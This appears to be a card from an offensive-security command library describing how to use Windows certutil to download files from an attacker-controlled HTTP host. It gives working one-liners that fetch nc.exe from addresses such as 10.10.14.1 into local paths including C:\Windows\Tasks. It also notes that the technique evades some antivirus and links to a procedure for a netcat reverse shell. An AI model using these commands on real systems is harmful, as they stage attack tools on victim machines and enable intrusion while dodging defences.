---
id: 44b5cb18-b166-455a-a4b2-5827fc1ea622
type: command
executor: command_prompt
data: >-
  certutil.exe -urlcache -split -f "http://$_ATTACKER_IP/$_FILENAME"
  $_PATH\$_FILENAME
output: >-
  C:\>certutil.exe -urlcache -split -f "http://10.10.10.100/nc.exe"
  C:\Windows\Tasks\nc.exe

  ****  Online  ****
    0000  ...
  CertUtil: -URLCache command completed successfully.
created_at: '2019-11-25T22:00:53.902277+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
platforms:
  - Windows
tags:
  - download
  - transfer
verified: true
validated: true
---

# Download File Remote HTTP Certutil

## Command

```command_prompt
certutil.exe -urlcache -split -f "http://$_ATTACKER_IP/$_FILENAME" $_PATH\$_FILENAME
```

## Description

Uses built-in certutil to download a file from HTTP to a local path, bypassing some AV by mimicking certificate operations.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -urlcache | Use URL cache | Yes |
| -split | Split output | Yes |
| -f | Force download | Yes |
| http://$_ATTACKER_IP/$_FILENAME | Remote URL | Yes |
| $_PATH\$_FILENAME | Local save path | Yes |

## Examples

### Basic Usage

```command_prompt
certutil.exe -urlcache -split -f "http://10.10.14.1/nc.exe" nc.exe
```

### To Specific Path

```command_prompt
certutil.exe -urlcache -split -f "http://attacker/nc.exe" C:\temp\nc.exe
```

## Expected Output

"CertUtil: -URLCache command completed successfully." with file bytes.

## Related

- [[procedures/upgrade-website-rce-to-netcat-reverse-shell-windows]]
- [[procedures/enumerate-windows-missing-patches-hotfixes-sherlock]]
